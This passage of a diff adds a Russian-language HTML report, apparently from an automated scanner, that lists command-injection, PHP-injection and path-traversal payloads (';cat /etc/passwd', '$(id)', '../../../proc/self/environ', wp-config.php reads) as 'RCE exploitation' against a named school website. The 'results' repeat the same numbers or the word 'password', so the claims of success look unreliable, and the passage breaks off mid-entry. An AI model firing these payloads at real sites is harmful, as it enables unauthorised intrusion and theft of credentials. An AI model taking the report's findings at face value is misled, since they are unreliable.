+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #16</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(uname -a)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #17</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;ps aux</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #18</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|ps aux</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #19</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`ps aux`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #20</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(ps aux)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #21</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><?php echo "RCE_TEST"; ?></pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">RCE_TEST</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #22</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #23</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/hosts</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #24</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/index.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #25</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #26</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #27</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../proc/self/environ</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #28</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;id</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #29</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|id</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #30</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`id`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #31</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(id)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #32</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;ls -la</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #33</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|ls -la</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #34</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`ls -la`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #35</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(ls -la)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #36</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;cat /etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #37</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|cat /etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #38</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`cat /etc/passwd`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
